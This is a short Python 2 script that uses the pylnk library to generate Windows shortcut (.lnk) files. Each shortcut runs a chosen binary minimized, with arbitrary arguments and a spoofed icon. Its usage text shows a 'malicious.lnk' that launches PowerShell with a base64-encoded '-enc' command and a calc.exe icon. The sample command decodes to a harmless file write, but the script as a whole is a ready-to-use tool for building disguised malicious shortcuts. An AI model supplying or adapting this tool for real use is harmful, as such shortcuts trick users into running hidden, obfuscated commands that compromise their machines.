#!/usr/bin/python

import pylnk
import datetime
import sys

def create_lnk(targetPath, savePath, arguments=None, icon=None):
    parts = targetPath.split('\\')

    lnkData = []
    lnkData.append((parts[0] + "\\"))

    for part in parts[1:-1]:
        levelEntry = {'type': 'FOLDER',
         'size': 0,
         'name': part,
         'created': datetime.datetime(2018, 10, 12, 23, 28, 11, 8476),
         'modified': datetime.datetime(2018, 10, 12, 23, 28, 11, 8476),
         'accessed': datetime.datetime(2018, 10, 12, 23, 28, 11, 8476)
        }
        lnkData.append(levelEntry)

    fileEntry = {'type': 'FILE',
     'size': 473600,
     'name': parts[-1],
     'created': datetime.datetime(2018, 10, 12, 23, 28, 11, 8476),
     'modified': datetime.datetime(2018, 10, 12, 23, 28, 11, 8476),
     'accessed': datetime.datetime(2018, 10, 12, 23, 28, 11, 8476)
    }
    lnkData.append(fileEntry)

    link = pylnk.from_segment_list(lnkData)
    link.window_mode = 'Minimized'


    if (arguments != None):
        link.arguments = arguments

    if (icon != None):
        link.icon = icon

    link.save(savePath)
    print "LNK for '%s %s' saved to %s" % (targetPath, arguments, savePath)
    sys.exit(1)


def usage():
    print "\nUsage: ./lnkCreate.py 'TARGET_BINARY' LNK_SAVE_PATH [OPTIONAL_ARGUMENTS] [OPTIONAL_ICON_PATH]\n"
    print "     Examples:\n"
    print "         ./lnkCreate.py 'C:\windows\system32\WindowsPowerShell\\v1.0\powershell.exe' malicious.lnk '-enc MQAyADMAIAA+ACAAQwA6AFwAVABlAG0AcABcAHQALgB0AHgAdAA='"
    print "         ./lnkCreate.py 'C:\windows\system32\WindowsPowerShell\\v1.0\powershell.exe' malicious.lnk '-enc MQAyADMAIAA+ACAAQwA6AFwAVABlAG0AcABcAHQALgB0AHgAdAA=' 'C:\Windows\System32\calc.exe'\n"
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 3 or len(sys.argv) > 5:
        usage()

    if len(sys.argv) == 3:
        create_lnk(targetPath=sys.argv[1], savePath=sys.argv[2])

    if len(sys.argv) == 4:
        create_lnk(targetPath=sys.argv[1], savePath=sys.argv[2], arguments=sys.argv[3])

    if len(sys.argv) == 5:
        create_lnk(targetPath=sys.argv[1], savePath=sys.argv[2], arguments=sys.argv[3], icon=sys.argv[4])


# lnkData = ['C:\\',
#      {'type': 'FOLDER',
#       'size': 0,            # optional for folders
#       'name': "Windows",
#       'created': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'modified': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'accessed': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476)
#      },
#      {'type': 'FOLDER',
#       'size': 0,            # optional for folders
#       'name': "System32",
#       'created': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'modified': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'accessed': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476)
#      },
#      {'type': 'FOLDER',
#       'size': 0,            # optional for folders
#       'name': "WindowsPowerShell",
#       'created': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'modified': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'accessed': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476)
#      },
#      {'type': 'FOLDER',
#       'size': 0,            # optional for folders
#       'name': "v1.0",
#       'created': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'modified': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'accessed': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476)
#      },
#      {'type': 'FILE',
#       'size': 473600,
#       'name': "powershell.exe",
#       'created': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'modified': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476),
#       'accessed': datetime.datetime(2012, 10, 12, 23, 28, 11, 8476)
#      }
#     ]
